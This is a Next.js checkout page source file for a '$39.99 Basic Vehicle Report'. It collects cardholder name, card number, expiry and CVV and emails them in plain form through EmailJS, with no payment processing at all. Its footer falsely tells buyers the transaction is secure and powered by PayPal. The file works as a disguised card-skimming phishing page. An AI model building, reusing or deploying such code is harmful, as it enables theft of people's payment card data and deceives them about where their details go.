'use client';
import { useState } from 'react';
import Image from 'next/image';
import emailjs from '@emailjs/browser';

export default function CheckoutPage() {
  const [cardType, setCardType] = useState('Visa');
  const [cardImage, setCardImage] = useState('/visa.svg');

  // Form fields
  const [formData, setFormData] = useState({
    name: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
  });

  // Handle form updates (general)
  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  // Expiry input with MM/YY slash logic
  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // keep only digits

    if (value.length >= 3) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    if (value.length > 5) {
      value = value.slice(0, 5);
    }

    setFormData({ ...formData, expiry: value });
  };

  // Handle card select
  const handleCardSelect = (type) => {
    setCardType(type);
    if (type === 'Visa') setCardImage('/visa.svg');
    if (type === 'Master Card') setCardImage('/mastercard.svg');
    if (type === 'American Express') setCardImage('/logo-american-express.png');
  };

  // Send email on checkout (with robust error logging)
  const handleCheckout = async () => {
    try {
      const result = await emailjs.send(
        process.env.service_svegc0i,
        process.env.template_qquocc7,
        {
          name: formData.name,
          card_number: formData.cardNumber,
          expiry: formData.expiry,
          cvv: formData.cvv,
          card_type: cardType,
          amount: '$39.99',
        },
        process.env.VjoUAxDSePXGF9KMD
      );

      console.log('✅ Email sent successfully:', result);
      alert('Checkout successful! Email sent.');
    } catch (error) {
      console.error('❌ Email sending error:', error);

      if (error?.text) console.error('Error text:', error.text);
      if (error?.status) console.error('Error status:', error.status);
      if (error?.response) {
        try {
          const res = await error.response.text();
          console.error('Raw response:', res);
        } catch (e) {
          console.error('Failed to parse error response:', e);
        }
      }

      alert('Something went wrong while sending email. Please try again.');
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-gray-100 p-4">
      <div className="bg-white shadow-lg rounded-lg w-full max-w-4xl flex flex-col md:flex-row">
        
        {/* Order Summary */}
        <div className="w-full md:w-1/2 p-6 border-r">
          <h2 className="text-2xl font-bold mb-4">Order Summary</h2>
          <div className="border-t mb-4" />
          <div className="flex items-center mb-4">
            <img
              src="/services-5.png"
              alt="Service"
              className="w-14 h-10 object-cover mr-4"
            />
            <div className="flex-grow">
              <p className="font-semibold">Basic Vehicle Report</p>
            </div>
            <div className="text-lg font-bold text-gray-800">$39.99</div>
          </div>
          <div className="border-t mb-4" />
          <div className="flex justify-between text-gray-600 mb-1">
            <span>Delivery</span>
            <span>$0.00</span>
          </div>
          <div className="flex justify-between font-bold text-lg">
            <span>TOTAL</span>
            <span>$39.99</span>
          </div>
        </div>

        {/* Credit Info */}
        <div className="w-full md:w-1/2 p-6">
          <label className="block mb-2 font-medium">Card Holder's Name</label>
          <input
            name="name"
            value={formData.name}
            onChange={handleChange}
            className="w-full border p-2 mb-4 rounded"
            placeholder="e.g. John Doe"
          />

          <label className="block mb-2 font-medium">Card Number</label>
          <input
            name="cardNumber"
            value={formData.cardNumber}
            onChange={handleChange}
            className="w-full border p-2 mb-4 rounded"
            placeholder="1234 1234 1234 1234"
          />

          <div className="flex gap-4 mb-4">
            <div className="flex-1">
              <label className="block mb-2 font-medium">Expiration Date</label>
              <input
                name="expiry"
                value={formData.expiry}
                onChange={handleExpiryChange}
                className="w-full border p-2 rounded"
                placeholder="MM/YY"
                maxLength={5}
              />
            </div>
            <div className="flex-1">
              <label className="block mb-2 font-medium">Security Code (CVV)</label>
              <input
                name="cvv"
                value={formData.cvv}
                onChange={handleChange}
                className="w-full border p-2 rounded"
                placeholder="123"
                maxLength={4}
              />
            </div>
          </div>

          <button
            onClick={handleCheckout}
            className="w-full bg-blue-600 text-white py-2 rounded mb-4"
          >
            Checkout
          </button>

          {/* Card Dropdown */}
          <div className="mb-4">
            <label className="block mb-2 font-medium">Select Card</label>
            <select
              onChange={(e) => handleCardSelect(e.target.value)}
              value={cardType}
              className="w-full border p-2 rounded"
            >
              <option>Visa</option>
              <option>Master Card</option>
              <option>American Express</option>
            </select>
          </div>

          {/* Card Logo */}
          <div className="flex items-center justify-center gap-4 mb-2">
            <Image src={cardImage} alt={cardType} width={60} height={40} />
          </div>

          <p className="text-sm text-center text-gray-600">
            This product is offered by a verified seller. All product details,
            images, and descriptions are provided directly by them. The
            transaction is secure and powered by PayPal.
          </p>
        </div>
      </div>
    </div>
  );
}
